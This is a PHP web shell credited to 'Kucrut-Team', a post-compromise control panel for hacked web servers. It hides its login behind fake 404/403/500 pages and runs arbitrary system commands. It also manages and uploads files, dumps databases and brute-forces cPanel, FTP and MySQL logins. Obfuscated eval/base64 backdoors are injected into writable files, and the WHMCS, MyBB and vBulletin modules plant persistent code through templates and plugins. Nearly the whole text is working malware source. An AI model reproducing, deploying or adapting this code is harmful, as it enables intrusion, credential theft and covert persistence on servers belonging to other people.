<?php
/*
	Author: 	Solevisible/Kucrut-Team
...
define("__HOST_VERSION__", "2.0");
define("__HOST_UPDATE__", "2");
define("__HOST_CODE_NAME__", "DOGE");
define("__HOST_DATA_FOLDER__", "HOST_DATA");
...
if($config['KucrutProtectShell']){
$SERVER_SIG = (isset($_SERVER["SERVER_SIGNATURE"])?$_SERVER["SERVER_SIGNATURE"]:"");
$Eform='<center><form method="post"><input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password"></form>';
if($config['KucrutLoginPage'] == 'gui'){
if(@$_COOKIE["KucrutUser"] != $config['KucrutUser'] && $_COOKIE["KucrutPass"] != md5($config['KucrutPass'])){
if(@$_POST["usrname"]==$config['KucrutUser'] && @md5($_POST["password"])==$config['KucrutPass']){
__kucrut_set_cookie("KucrutUser", $config['KucrutUser']);
__kucrut_set_cookie("KucrutPass", @md5($config['KucrutPass']));
...
<center><img style="border-radius:100px;" width="500" height="250" alt="kucrut team 2012" draggable="false" src="https://kucrut.xyz/images/kucrut.png" /></center>
...
}elseif($config['KucrutLoginPage']=='500'){
if(@$_COOKIE["KucrutPass"] != @md5($config['KucrutPass'])){
if(@md5($_POST["password"])==$config['KucrutPass']){
__kucrut_set_cookie("KucrutUser", $config['KucrutUser']);
__kucrut_set_cookie("KucrutPass", @md5($config['KucrutPass']));
@header('location: '.$_SERVER["PHP_SELF"]);
}
...
}elseif($config['KucrutLoginPage']=='403'){
if(@$_COOKIE["KucrutPass"] != @md5($config['KucrutPass'])){
if(@md5($_POST["password"])==$config['KucrutPass']){
__kucrut_set_cookie("KucrutUser", $config['KucrutUser']);
__kucrut_set_cookie("KucrutPass", @md5($config['KucrutPass']));
...
}elseif($config['KucrutLoginPage']=='404'){
if(@$_COOKIE["KucrutPass"] != @md5($config['KucrutPass'])){
if(@md5($_POST["password"])==$config['KucrutPass']){
__kucrut_set_cookie("KucrutUser", $config['KucrutUser']);
__kucrut_set_cookie("KucrutPass", @md5($config['KucrutPass']));
...
echo "<head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><style>input{position:fixed;left:150px;bottom:150px;z-index:9999;background-color:fff;border:1px solid #fff;text-align:center}</style></body></html>".$Eform;
exit;
}
}
}
...
echo '<script>';
foreach($kucrutx as $kucrut){
if(in_array($kucrut,$find))
continue;
echo 'kucrut'.$kucrut."_=";
}
echo '""</script>';
}}
...
$kucrutWs = new COM('WScript.shell');
$exec = $kucrutWs->exec('cmd.exe /c '.$_POST['kucrut1']);
$stdout = $exec->StdOut();
$out=$stdout->ReadAll();
}
}catch(Exception $e){}
...
echo "PWD:<font color=#FFFFFF> " . str_replace("\\","/",@kucrutGetCwd()) . "/<br />";
...
echo 'CWD: <input type="text" name="cwd" value="'.str_replace("\\","/",@kucrutGetCwd()).'/" size="59"><p><input type="file" name="file" size="45"><input name="upload" type="submit" id="_upl" value="Upload"></p></form></center>';
...
$solevisible = "cd '".addslashes(str_replace("\\","/",@kucrutGetCwd()))."'".$separator."".__ZGVjb2Rlcg($_POST['command_solevisible']);
echo kucrutEx($solevisible);
}
echo'</pre>
</body></html>';
exit;}
...
function kucruthead(){
$GLOBALS['__HOST_SHELL_CODE'] = '';
$kucrut_uploader = '$x = base64_decode("'.$GLOBALS['__HOST_SHELL_CODE'].'");$solevisible = fopen("solevisible.php","w");fwrite($solevisible,$x);';
define("KUCRUT_UPLOADER", "eval(base64_decode('".__ZW5jb2Rlcg($kucrut_uploader)."'))");
if(!isset($_POST['ajax'])){
function Kucrut_GetDisable_Function(){
$disfun = @ini_get('disable_functions');
...
return('<span class="disable_functions">'.$dis.'</span><a id="menu_opt_GetDisFunc" href=javascript:void(0) onclick="kucrut_can_add_opt = true;g(\'GetDisFunc\',null,\'wp\');"><span class="header_show_all">Show All ('.$i.')</span></a>');
}
function KucrutNum(){
$args = func_get_args();
$kucrutx = array();
...
<link href="'.__showicon('kucrutmini').'" rel="icon" type="image/x-icon"/>
...
$cmd_uname = kucrutEx("uname -a",false,false);
...
for($s=1;$s<=10;$s++){
echo '<input type="hidden" name="kucrut'.$s.'">';
}
echo '<input type="hidden" name="charset">
</form>
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?solevisible"><span style="color:#42ff59;">'.__HOST_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__HOST_VERSION__.'</span></small></a></div>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="kucrut team 2012" draggable="false" src="https://kucrut.xyz/images/kucrut.png" /></td>
</tr>
<tr>
...
if($GLOBALS['sys']=='unix'){
$d0mains = _kucrut_file("/etc/named.conf",false);
...
<td><span class="header_vars">Total:</span><b>'.kucrutSize($totalSpace).' </b><span class="header_vars">Free:</span><b>' . kucrutSize($freeSpace) . ' ['. (int) ($freeSpace/$totalSpace*100) . '%]</b></td>
</tr>';
if($GLOBALS['sys']=='unix'){
...
if(!@ini_get('safe_mode')){
if(strlen(kucrutEx("id",false,false))>0){
echo '<tr><td height="18" colspan="2"><span class="header_vars">Useful : </span>';
$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzikucrut2','nc','locate','suidperl');
$x=0;
foreach($userful as $item)if(kucrutWhich($item)){$x++;echo '<span class="header_values" style="margin-left: 4px;">'.$item.'</span>';}
...
$x=0;
foreach($downloaders as $item2)if(kucrutWhich($item2)){$x++;echo '<span class="header_values" style="margin-left: 4px;">'.$item2.'</span>';}
...
echo('<li><a id="menu_opt_'.$key.'" href="#action=options&path='.$GLOBALS['cwd'].'&opt='.$key.'" class="menu_options" onclick="kucrut_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt='.$key.'\';g(\''.$key.'\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">'.$value.'</a></li>'."\n");
}
echo '</ul><div style="text-align: center;padding: 6px;"><a id="menu_opt_settings" href="#action=options&path='.$GLOBALS['cwd'].'&opt=settings" class="menu_options" onclick="kucrut_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=settings\';g(\'settings\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">Kucrut Settings</a><a style="display:none;" id="menu_opt_market" href="#action=options&path='.$GLOBALS['cwd'].'&opt=market" class="menu_options" onclick="kucrut_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=market\';g(\'market\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;"><span class="kucrut_plus">Kucrut market</span></a><a id="menu_opt_aboutus" href="#action=options&path='.$GLOBALS['cwd'].'&opt=aboutus" class="menu_options" onclick="kucrut_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=aboutus\';g(\'aboutus\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">About Us</a>'.(!empty($_COOKIE['KucrutUser']) && !empty($_COOKIE['KucrutPass']) ? '<a href="javascript:void(0);" onclick="kucrutLogOut();"><font color="red">LogOut</font></a>':'').'</div></div><div id="filesman_tabs"><div onmouseover="kucrutFilesmanTabShowTitle(this,event);" onmouseout="kucrutFilesmanTabHideTitle(this,event);" fm_counter="1" path="'.$GLOBALS['cwd'].'" fm_id="1" id="filesman_tab_1" class="filesman_tab filesman-tab-active" onclick="filesmanTabController(this);"><img class="folder-tab-icon" src="https://solevisible.com/icons/menu/folder2.svg"> <span>File manager</span></div><div style="display:inline-block;" id="filesman_tabs_child"></div><div id="filesman_new_tab" class="filesman_tab" style="background: maroon;" onClick="kucrutFilesManNewTab(c_,\'/\',1);">New Tab +</div></div>';}else{
@error_reporting(E_ALL ^ E_NOTICE);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
...
function kucrutlogout(){
@setcookie("KucrutUser", null, 2012);
@setcookie("KucrutPass", null, 2012);
unset($_COOKIE['KucrutUser'],$_COOKIE['KucrutPass']);
echo("ok");
}
...
function __showicon($r){
	...
	$s['loader']='https://kucrut.xyz/images/loader.png';
...
if($_POST['kucrut2']!=''&&$_POST['kucrut3']!=''&&$_POST['kucrut4']!=''){
$method = $_POST['kucrut2'];
$file = $_POST['kucrut3'];
$shell = $_POST['kucrut4'];
$key = str_replace(array('"','\''),'',trim($_POST['kucrut5']));
if($key=='')$key='kucrut';
if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__HOST_SHELL_CODE'];}
$code = '<?php if(isset($_GET["kucrut"])&&$_GET["kucrut"]=="'.$key.'"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x("'.$shell.'");exit;}?>';
if(@is_file($file)&&@is_writable($file)){@file_put_contents($file,$code."\n".@file_get_contents($file));__alert($success."<br>Run With: ".basename($file)."?kucrut=".$key.'</font>');}else{__alert($error);}}}
if($_POST['kucrut1']=='db'){
...
'td6' =>
array('color' => 'FFFFFF', 'tdName' => 'Key: ', 'inputName' => 'key', 'inputValue' => 'kucrut', 'inputSize' => '50')
);
create_table($table);
echo("<p>{$select}</p>");
echo($textarea);
echo("<p><input type='submit' value=' '></p></form></p></center>");
if($_POST['kucrut2']!=''&&$_POST['kucrut3']!=''&&$_POST['kucrut5']!=''&&$_POST['kucrut6']!=''){
$dbhost = $_POST['kucrut2'];
$dbuser = $_POST['kucrut3'];
$dbpw = $_POST['kucrut4'];
$dbname = $_POST['kucrut5'];
$file = $_POST['kucrut6'];
$method = $_POST['kucrut7'];
$shell = $_POST['kucrut8'];
$key = str_replace(array('"','\''),'',trim($_POST['kucrut9']));
if($key=='')$key='kucrut';
if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__HOST_SHELL_CODE'];}
if($conn = mysqli_connect($dbhost,$dbuser,$dbpw,$dbname)){
$code = '<?php if(isset($_GET["kucrut"])&&$_GET["kucrut"]=="'.$key.'"){$conn=mysqli_connect("'.str_replace('"','\"',$dbhost).'","'.str_replace('"','\"',$dbuser).'","'.str_replace('"','\"',$dbpw).'","'.str_replace('"','\"',$dbname).'");$q=mysqli_query($conn,"SELECT `code` FROM kucrut_bc LIMIT 0,1");$r=mysqli_fetch_assoc($q);$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x($r["code"]);exit;}?>';
if(@is_file($file)&&@is_writable($file)){
@mysqli_query($conn,'DROP TABLE `kucrut_bc`');
@mysqli_query($conn,'CREATE TABLE `kucrut_bc` (code LONGTEXT)');
@mysqli_query($conn,'INSERT INTO `kucrut_bc` VALUES("'.$shell.'")');
@file_put_contents($file,$code."\n".@file_get_contents($file));
__alert($success."<br>Run With: ".basename($file)."?kucrut=".$key.'</font>');}else{__alert($error);}}}}
echo('</div>');
kucrutfooter();
}
function kucrutwhois(){
...
if($_POST['kucrut2']=='>>'&&!empty($_POST['kucrut1'])){
$site = str_replace(array('http://','https://','www.','ftp://'),'',$_POST['kucrut1']);
$target = 'http://api.whoapi.com/?apikey=093b6cb9e6ea724e101928647df3e009&r=whois&domain='.$site;
$data = @file_get_contents($target);
if($data==''){$get = new KucrutCURL();$get->ssl = true;$data = $get->Send($target);}
$target = @json_decode($data,true);
echo __pre();
if(is_array($target)){echo($target["whois_raw"]);}else{echo kucrutEx("whois ".$site);}}
echo("</div>");
}
function kucrutremotedl(){
kucruthead();
...
if(isset($_POST['kucrut1'],$_POST['kucrut2'],$_POST['kucrut3'])&&!empty($_POST['kucrut1'])&&$_POST['kucrut3']=='>>'){
echo __pre();
$url = $_POST['kucrut1'];
$path = $_POST['kucrut2'];
echo('<center>');
...
$buff = kucrutEx("wget ".$url." -O ".$saveas);
if(@is_file($saveas)) return true;
$buff = kucrutEx("curl ".$url." -o ".$saveas);
if(@is_file($saveas)) return true;
$buff = kucrutEx("lwp-download ".$url." ".$saveas);
if(@is_file($saveas)) return true;
$buff = kucrutEx("lynx -source ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
$buff = kucrutEx("GET ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
$buff = kucrutEx("links -source ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
$buff = kucrutEx("fetch -o ".$saveas." -p ".$url);
if(@is_file($saveas)) return true;
return false;
}
...
function kucrutMarket(){
echo "<div class='header'>";
$curl = new KucrutCURL();
$content = $curl->Send("https://solevisible.com/market.php");
...
function kucrutSettings(){
kucruthead();
KucrutNum(6,7,8,9,10);
...
foreach($penc_array as $key=>$val)$cgiapi_html .= '<option value="'.$key.'" '.(!empty($_POST['kucrut9'])&&$_POST['kucrut9']==$key?"selected":($GLOBALS["DB_NAME"]["cgi_api"]&&empty($_POST['kucrut9'])?'selected':'')).'>'.$val.'</option>';
foreach($penc_array as $key=>$val)$postEnc_html .= '<option value="'.$key.'" '.(!empty($_POST['kucrut7'])&&$_POST['kucrut7']==$key?"selected":(__HOST_POST_ENCRYPTION__&&empty($_POST['kucrut7'])?'selected':'')).'>'.$val.'</option>';
...
echo '';
echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#FFFFFF">Protect:</div></td><td><select name="protect" style="width:100%;">'.$protect_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Cgi Api:</div></td><td><select name="cgi_api" style="width:100%;">'.$cgiapi_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$postEnc_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$icon_html.'</select></td></tr><tr><tr><td><div class="tbltxt" style="color:#FFFFFF">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$login_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['kucrut3'])?$GLOBALS['DB_NAME']['user']:$_POST['kucrut3']).'" placeholder="solevisible"></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Password:</div></td><td><input type="text" style="width:95%;" name="password" placeholder="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
if($_POST['kucrut5']=='>>'){
echo __pre();
if(!empty($_POST['kucrut3'])){
$protect = $_POST['kucrut1'];
$lgpage = $_POST['kucrut2'];
$username = $_POST['kucrut3'];
$password = md5($_POST['kucrut4']);
$icon = $_POST['kucrut6'];
$post_encrypt = $_POST['kucrut7'];
$cgi_api_val = $_POST['kucrut9'];
...
if(!empty($_POST['kucrut4'])&&preg_match($find_pw,$data,$e)){
...
echo '<b>UserName: </b><font color="green"><b>'.$username.'</b></font><br /><b>Password: </b><font color="green"><b>'.$_POST['kucrut4'].'</b></font><script>post_encryption_mode = '.$post_encrypt.';</script>';
}else{
...
function kucrutaboutus(){
kucruthead();
echo '<div class="header">';
$news = new KucrutCURL();
$about_us = $news->Send("https://solevisible.com/aboutus.php");
if(empty($about_us)){
$about_us = "<pre><center><img src='https://solevisible.com/images/farvahar-iran.png'><br>
<b><font size='+3' color='#f20b0b'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
<font color='#f20b0b'>Shell By Kucrut</font><br>
...
$delimiter = (!empty($_POST['kucrut1']) ? $_POST['kucrut1'] : '::');
$selected_data = json_decode($_POST['kucrut2'], true);
$username = ($_POST['kucrut3']);
$password = ($_POST['kucrut4']);
$dbname = ($_POST['kucrut5']);
$dfile = ($_POST['kucrut6']);
$host = ($_POST['kucrut7']);
$table = array('td1' =>
...
$table = array('td1' =>
 ...
 array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Dump Path: ', 'inputName' => 'dfile', 'inputValue' => htmlspecialchars($GLOBALS['cwd']).'kucrut.sql', 'inputSize' => '50')
);
create_table($table);
echo "<br><input type='submit' value=' ' name='Submit'></p></form></center>";
$username = ($_POST['kucrut3']);
...
kucrutEx("mysqldump --single-transaction --host=\"$host\" --user=\"$username\" --password=\"$password\" $dbname > '".addslashes($dfile)."'");
echo($msg);
}else{
__alert("Error...!");
}
...
function Kucrut_DirectAdmin_Cracker($info){
if(!$info['mysql'])
...
function Kucrut_CP_Cracker($info){
...
function Kucrut_FTP_Cracker($info){
...
function Kucrut_Call_Function_Cracker($method,$info){
switch($method){case 'cp':return Kucrut_CP_Cracker($info);break;case 'direct': case 'phpmyadmin':return Kucrut_DirectAdmin_Cracker($info);break;case 'ftp':return Kucrut_FTP_Cracker($info);break;case 'mysql':return Kucrut_Mysql_Cracker($info);break;case 'mysql':return Kucrut_FTPC($info);break;}
}
function kucrutCrackers(){
kucruthead();
KucrutNum(9,10);
...
<textarea placeholder="Users" rows="20" cols="25" name="usernames">'.($GLOBALS['sys']=='unix'?kucrutEx("cut -d: -f1 /etc/passwd"):"").'</textarea>
...
$target = str_replace(array('https://','http://','ftp://'),'',$_POST['kucrut1']);
$port = $_POST['kucrut2'];
$usernames= $_POST['kucrut3'];
$passwords = $_POST['kucrut4'];
$fcrack = $_POST['kucrut5'];
$cracking = $_POST['kucrut6'];
$protocol = $_POST['kucrut7'];
$loginpanel = $_POST['kucrut8'];
...
Kucrut_Call_Function_Cracker($loginpanel,$array);
}
}
...
if(isset($_POST['kucrut1']) && $_POST['kucrut1']== 'whmcs'){
KucrutNum();
...
$dbh = $_POST['kucrut9'];
$path = $_POST['kucrut10'];
$method = $_POST['kucrut4'];
$index = "{php}".KUCRUT_UPLOADER.";{/php}";
...
$KucrutSole = new KucrutCURL(true);
$saveurl = $KucrutSole->Send($path."/pwreset.php");
$getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
$KucrutSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=solevisible@fbi.gov");
...
}if(isset($_POST['kucrut2']) && $_POST['kucrut2']== 'mybb'){
KucrutNum(1,2,3,5);
...
$dbp = $_POST['kucrut8'];
$dbh = $_POST['kucrut9'];
$prefix = $_POST['kucrut10'];
$method = $_POST['kucrut4'];
$shellCode = "{\${".KUCRUT_UPLOADER."}}";
...
$KucrutCurl->Send($realurl.$realpath."/calendar.php");
$res = true;
}
if($res){
...
if(isset($_POST['kucrut3']) && $_POST['kucrut3']== 'vb'){
KucrutNum(1,2,7,9,10);
...
if(isset($_POST['kucrut4'])&&!empty($_POST['kucrut4'])){
$method = $_POST['kucrut8'];
$faq_name = "faq";
$faq_file = "/faq.php";
$code = "{\${".KUCRUT_UPLOADER."}}{\${exit()}}&";
$conn=@mysqli_connect($_POST['kucrut2'],$_POST['kucrut4'],$_POST['kucrut5'],$_POST['kucrut7']) or die(@mysqli_connect_error());
...
$geturl = @mysqli_query($conn,"select `value` from ".$_POST['kucrut6']."setting WHERE `varname`='bburl'");
...
$check = fgets($fsock);
if(preg_match("/200 OK/i",$check)){
$p1 = "UPDATE ".$_POST['kucrut6']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
...
$KucrutCurl->Send($realurl.$realpath.$faq_file);
$p1 = "UPDATE ".$_POST['kucrut6']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
$ka1= @mysqli_query($conn,$p1) or die(mysqli_error($conn));
$res = true;
}
...
kucrutCreateParentFolder();
@chdir($GLOBALS['home_cwd'] . "/" . __HOST_DATA_FOLDER__);
@mkdir('kucrut_shtml',0755);
@chdir('kucrut_shtml');
kucrutcgihtaccess('shtml');
...
@__write_file('kucrut_ssi.shtml',__get_resource($code));
@chmod("kucrut_ssi.shtml",0755);
echo KucrutiFrameCreator('kucrut_shtml/kucrut_ssi.shtml');
echo '</div>';
kucrutfooter();
}
function kucrutcloudflare(){
kucruthead();
KucrutNum(8,9,10,7,6,5,4,3);
...
if($_POST['kucrut2'] && $_POST['kucrut2'] == '>>'){
$url = $_POST['kucrut1'];
...
echo '<?xml version="1.0" encoding="ISO-8859-1"?><plugins><plugin active="1" product="vbulletin"><title>vBulletin</title><hookname>init_startup</hookname><phpcode><![CDATA[if (strpos($_SERVER[\'PHP_SELF\'],"subscriptions.php")){eval(base64_decode(\''.__ZW5jb2Rlcg($_POST['kucrut1']).'\'));exit;}]]></phpcode></plugin></plugins>';
echo '</textarea></center></p>';
}
echo '</center></div>';
kucrutfooter();
}
function kucrutcpcrack(){
kucruthead();
...
<tr>
<td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><span class='footer_text'>Execute :</span><br><button onClick='kucrutOpenPhpTerminal();return false;' class='foottable kucrut_custom_cmd_btn'><img style='width:28px;vertical-align: middle;' src='https://solevisible.com/icons/menu/terminal.svg'> Terminal</button><br></form></td>
</tr>
<tr>
...
<div id='rightclick_menu'>
  <a target='_blank' href='' name='newtab'><img src=\"https://solevisible.com/icons/menu/newtab.svg\"> Open in new tab</a>
  <a target='_blank' href='' name='link'><img src=\"https://solevisible.com/icons/menu/link.svg\"> Open file directly</a>
  <a href='javascript:void(0);' name='download'><img src=\"https://solevisible.com/icons/menu/download2.svg\"> Download</a>
  <a href='' name='view'><img src=\"https://solevisible.com/icons/menu/view.svg\"> View</a>
  <a href='javascript:void(0);' onclick='kucrutSyncMenuToOpt(this);' path='' fname='' name='view_archive'><img src=\"https://solevisible.com/icons/menu/view.svg\"> View Archive</a>
  <a href='' name='edit'><img src=\"https://solevisible.com/icons/menu/edit.svg\"> Edit</a>
  <a href='javascript:void(0);' onclick='kucrutPopupAction(this, \"move\");' ftype='' path='' fname='' href='' href='' name='move'><img src=\"https://solevisible.com/icons/menu/move.svg\"> Move</a>
  <a href='javascript:void(0);' onclick='kucrutPopupAction(this, \"copy\");' ftype='' path='' fname='' href='' name='copy'><img src=\"https://solevisible.com/icons/menu/copy.svg\"> Copy</a>
  <a href='javascript:void(0);' onclick='kucrutPopupAction(this, \"rename\");' ftype='' path='' fname='' name='rename'><img src=\"https://solevisible.com/icons/menu/rename.svg\">  Rename</a>
  <a href='javascript:void(0);' onclick='kucrutPopupAction(this, \"modify\");' ftype='' path='' fname='' name='modify'><img src=\"https://solevisible.com/icons/menu/time.svg\">  Modify</a>
  <a href='javascript:void(0);' onclick='kucrutPopupAction(this, \"permission\");' name='permission'><img src=\"https://solevisible.com/icons/menu/key.svg\"> Change Permissions</a>
  <a href='javascript:void(0);' onclick='kucrutSyncMenuToOpt(this);' path='' fname='' name='compress'><img src=\"https://solevisible.com/icons/menu/resize.svg\"> Compress</a>
  <a href='javascript:void(0);' onclick='kucrutSyncMenuToOpt(this);' path='' fname='' name='extract'><img src=\"https://solevisible.com/icons/menu/increase.svg\"> Extract</a>
  <a href='javascript:void(0);' name='delete'><img src=\"https://kucrut.xyz/images/delete.svg\"> Delete</a>
</div>
...
function kucrutWhich($p) {
$path = kucrutEx('which ' . $p,false,false);
if(!empty($path))
return strlen($path);
return false;
}
function kucrutSize($s) {
if($s >= 1073741824)
...
function kucrutFilesMan(){
if(!empty ($_COOKIE['kucrut_f']))
$_COOKIE['kucrut_f'] = @unserialize($_COOKIE['kucrut_f']);
if(!empty($_POST['kucrut1'])){
switch($_POST['kucrut1']){
case 'uploadFile':
$move_cmd_file = false;
...
if(@is_dir(rawurldecode(@$_POST['kucrut2']))&&rawurldecode(@$_POST['kucrut2'])!='..'){
deleteDir(rawurldecode(@$_POST['kucrut2']));
kucrutEx("rm -rf '".addslashes($_POST['kucrut2'])."'",false,false);
}else{
...
break;
case 'paste':
if($_COOKIE['kucrut_act'] == 'copy'&&isset($_COOKIE['kucrut_f'])){
foreach($_COOKIE['kucrut_f'] as $f)
copy_paste($_COOKIE['kucrut_c'],$f, $GLOBALS['cwd']);
}elseif($_COOKIE['kucrut_act'] == 'move'&&isset($_COOKIE['kucrut_f'])){
...
foreach($_COOKIE['kucrut_f'] as $f)
@rename($_COOKIE['kucrut_c'].$f, $GLOBALS['cwd'].$f);
}elseif($_COOKIE['kucrut_act'] == 'zip'&&isset($_COOKIE['kucrut_f'])){
if(class_exists('ZipArchive')){
$zip = new ZipArchive();
$zipX = "kucrut_".rand(1,1000).".zip";
if($zip->open($zipX, 1)){
@chdir($_COOKIE['kucrut_c']);
foreach($_COOKIE['kucrut_f'] as $f){
if($f == '..')continue;
if(@is_file($_COOKIE['kucrut_c'].$f))
$zip->addFile($_COOKIE['kucrut_c'].$f, $f);
elseif(@is_dir($_COOKIE['kucrut_c'].$f)){
...
}elseif($_COOKIE['kucrut_act'] == 'unzip'&&isset($_COOKIE['kucrut_f'])){
if(class_exists('ZipArchive')){
$zip = new ZipArchive();
foreach($_COOKIE['kucrut_f'] as $f) {
if($zip->open($_COOKIE['kucrut_c'].$f)){
$zip->extractTo($_COOKIE['kucrut_cwd']);
$zip->close();}}}}
unset($_COOKIE['kucrut_f']);
break;
default:
if(!empty($_POST['kucrut1'])){
if(in_array($_POST['kucrut1'], array("copy", "move", "zip", "unzip"))){
__kucrut_set_cookie('kucrut_act', @$_POST['kucrut1']);
__kucrut_set_cookie('kucrut_f', @serialize($_POST['f']));
__kucrut_set_cookie('kucrut_c', @$_POST['c']);
return;
}
}
break;
...
$kucrut_files_page_number = isset($_POST["pagenum"]) ? (int)$_POST["pagenum"] : 1;
...
$file_perm = kucrutPermsColor(array("class"=>$dirContent[$i]["permcolor"],"num"=>$dirContent[$i]["permnum"],"human"=>$dirContent[$i]["permhuman"]),true);
...
$file_perm = kucrutPermsColor($GLOBALS['cwd'].$filename);
...
<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
<select id='tools_selector' name='kucrut1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete' selected>Delete</option><option value='zip'>Add 2 Compress (zip)</option><option value='unzip'>Add 2 Uncompress (zip)</option><option value='paste'>Paste / Zip / Unzip </option></select>
...
if(!_kucrut_file_exists(@$_POST['kucrut1'])){
echo __pre()."<center><p><div class=\"txtfont\"><font color='red'>!...FILE DOEST NOT EXITS...!</font></div></p></center></div><script>editor_error=false;removeHistory('".$_POST['kucrut4']."');</script>";
kucrutFooter();
return;
}
if($chdir_fals){
...
$permcolor = kucrutPermsColor(array("class"=>$perm_color_class,"num"=>$file_info[5],"human"=>$file_info[6]),true);
}else{
$uid = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($_POST['kucrut1'])):'';
$gid = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($_POST['kucrut1'])):'';
if(!$uid&&!$gid){
$uid['name'] = function_exists("fileowner")?@fileowner($_POST['kucrut1']):'';
$gid['name'] = function_exists("filegroup")?@filegroup($_POST['kucrut1']):'';
}
...
if(!_kucrut_is_dir($_POST['kucrut1'])){
...
echo('<div>');
foreach($m as $v)
echo $v == 'Delete' ? '<a href="javascript:void(0);" onclick="var chk=confirm(\'Are You Sure For Delete This File ?\');chk?editor(\''.addslashes(!isset($rename_cache)?$_POST['kucrut1']:$rename_cache).'\',\''.strtolower($v).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['kucrut4'].'\',\''.$ftype.'\'):\'\';"><span class="editor_actions">'.((strtolower($v)==@$_POST['kucrut2'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a> ' : '<a href="javascript:void(0);" onclick="editor(\''.addslashes(!isset($rename_cache)?$_POST['kucrut1']:$rename_cache).'\',\''.strtolower($v).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['kucrut4'].'\',\''.$ftype.'\')"><span class="editor_actions">'.((strtolower($v)==@$_POST['kucrut2'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a>';
echo '</div>';
switch($_POST['kucrut2']){
case 'view':case 'edit':
@chdir($_POST['c']);
$disabled_btn = "";
if(!@is_writable($_POST['kucrut1'])&&!_kucrut_is_writable($_POST['kucrut1'])){
$disabled_btn = "disabled=disabled";
$disabled_btn_style= 'background: #ff0000;color: #fff;';
}
if(!empty($_POST['kucrut3'])){
$_POST['kucrut3'] = substr($_POST['kucrut3'],1);
...
if($fp){
echo 'Saved!<br>';
@touch($_POST['kucrut1'],$time,$time);
}
}
echo '<div class="editor-view"><div class="view-content editor-ace-controller"><div style="display:inline-block;">'._kucrut_load_ace_options("editor").'<button style="border-radius:10px;" class="button ace-controler" onClick="copyToClipboard(this);">Copy</button> <button class="button ace-controler" onclick="kucrutAceToFullscreen(this);">Full Screen</button> <button onclick="var ace_val = kucrut_ace_editors.editor[this.getAttribute(\'ace_id\')].getValue();editor(\''.addslashes($kucrut1_decoded).'\',\'edit\',\'1\'+ace_val,\''.$_POST['c'].'\',\''.$_POST['kucrut4'].'\',\''.$ftype.'\');return false;" class="button ace-controler ace-save-btn" style="width: 100px;height: 33px;'.$disabled_btn_style.'" '.$disabled_btn.'>save</button></div><pre class="ml1 view_ml_content">';
echo htmlspecialchars(__read_file($_POST['kucrut1']));
echo '</pre></div></div>';
break;
case 'highlight':
@chdir($_POST['c']);
if(@is_readable($_POST['kucrut1'])){
echo '<div class="editor-view"><div class="view-content"><div class="ml1" style="background-color: #e1e1e1;color:black;">';
$code = @highlight_file($_POST['kucrut1'],true);
...
if(!empty($_POST['kucrut3'])){
$perms = 0;
